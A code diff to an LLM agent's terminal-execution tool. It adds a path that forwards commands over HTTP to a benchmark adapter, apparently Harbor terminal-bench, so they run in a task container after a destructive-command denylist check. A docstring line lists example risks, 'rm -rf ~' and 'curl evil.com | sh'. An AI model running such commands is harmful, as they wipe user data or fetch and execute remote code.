@@ -50,11 +50,15 @@ Risk acknowledged: the LLM can now `rm -rf ~`, `curl evil.com | sh`,
 """
 from __future__ import annotations
 
+import contextvars
 import os
 import re
 import shlex
 import subprocess
 from dataclasses import dataclass
+from typing import Optional
+
+import requests
 
 
 # Output cap (stdout + stderr combined). Anything past this is
@@ -63,6 +67,44 @@ MAX_OUTPUT_BYTES = 16 * 1024
 
 DEFAULT_TIMEOUT_SECONDS = 30
 MAX_TIMEOUT_SECONDS = 120
+
+
+# ─── Remote-exec override (Harbor terminal-bench adapter) ─────────
+#
+# When `_REMOTE_EXEC_CALLBACK` is set in the current context, `run_terminal`
+# dispatches the command via HTTP POST to the callback URL instead of running
+# it locally as a subprocess. The Harbor `hrant_agent.py` adapter uses this:
+# it starts an aiohttp server on an ephemeral port, sets the ContextVar via
+# the `/api/exec-protocol` endpoint, and forwards each callback to
+# `environment.exec(...)` — Harbor's docker exec primitive — so terminal_exec
+# operates against the task container instead of the host.
+#
+# Catastrophic-denylist checks run BEFORE the remote dispatch — destructive
+# commands are refused regardless of where they would execute (the task
+# container can have host volume mounts; same threat model applies).
+_REMOTE_EXEC_CALLBACK: contextvars.ContextVar[Optional[str]] = contextvars.ContextVar(
+    "hrant_terminal_exec_remote_callback", default=None,
+)
+
+
+def set_remote_exec_callback(url: Optional[str]) -> contextvars.Token:
+    """Set the callback URL for the current context. Returns a Token
+    the caller must pass to `reset_remote_exec_callback` on exit."""
+    return _REMOTE_EXEC_CALLBACK.set(url or None)
+
+
+def reset_remote_exec_callback(token: contextvars.Token) -> None:
+    """Restore the prior ContextVar value (None if no nesting)."""
+    try:
+        _REMOTE_EXEC_CALLBACK.reset(token)
+    except Exception:
+        pass
+
+
+# Timeout for the outbound HTTP POST to the callback URL. The CALLBACK is
+# expected to await `environment.exec` on the container, which can legitimately
+# take a few minutes for a heavy build. We cap at 600s as the safety net.
+_REMOTE_HTTP_TIMEOUT_S = 600
 
 
 # ─── Catastrophic-command denylist ─────────────────────────────────
@@ -433,6 +475,50 @@ def run_terminal(
 
     timeout = max(1, min(int(timeout_seconds or DEFAULT_TIMEOUT_SECONDS), MAX_TIMEOUT_SECONDS))
     start = _time.monotonic()
+    # Remote-exec dispatch path. When the ContextVar is set we POST the
+    # command to the harbor adapter's loopback server; the adapter awaits
+    # environment.exec() and returns the result as JSON. Denylist already
+    # ran above; output truncation applies the same as the local path.
+    callback_url = _REMOTE_EXEC_CALLBACK.get()
+    if callback_url:
+        try:
+            resp = requests.post(
+                callback_url,
+                json={
+                    "command": command,
+                    "cwd": cwd or "",
+                    "timeout_sec": timeout,
+                },
+                timeout=_REMOTE_HTTP_TIMEOUT_S,
+            )
+            resp.raise_for_status()
+            data = resp.json()
+        except Exception as e:
+            elapsed = int((_time.monotonic() - start) * 1000)
+            return TerminalResult(
+                ok=False, command=command, exit_code=-1,
+                stdout="", stderr="",
+                truncated=False, elapsed_ms=elapsed,
+                error=f"remote-exec callback failed: {type(e).__name__}: {e}",
+            )
+        elapsed = int((_time.monotonic() - start) * 1000)
+        rc_raw = data.get("return_code", -1)
+        rc = int(rc_raw) if rc_raw is not None else -1
+        stdout_cap = (MAX_OUTPUT_BYTES * 2) // 3
+        stderr_cap = MAX_OUTPUT_BYTES - stdout_cap
+        out, out_trunc = _truncate((data.get("stdout") or "").encode("utf-8"), stdout_cap)
+        err_text, err_trunc = _truncate((data.get("stderr") or "").encode("utf-8"), stderr_cap)
+        return TerminalResult(
+            ok=(rc == 0),
+            command=command,
+            exit_code=rc,
+            stdout=out,
+            stderr=err_text,
+            truncated=(out_trunc or err_trunc),
+            elapsed_ms=elapsed,
+            error="" if rc == 0 else f"exit code {rc}",
+        )
+
     # Prefer /bin/bash on POSIX so commands using bash features (set -o
     # pipefail, [[ ]], arrays, process substitution, here-strings) work
     # idiomatically. Default shell=True on Linux runs `/bin/sh -c ...`
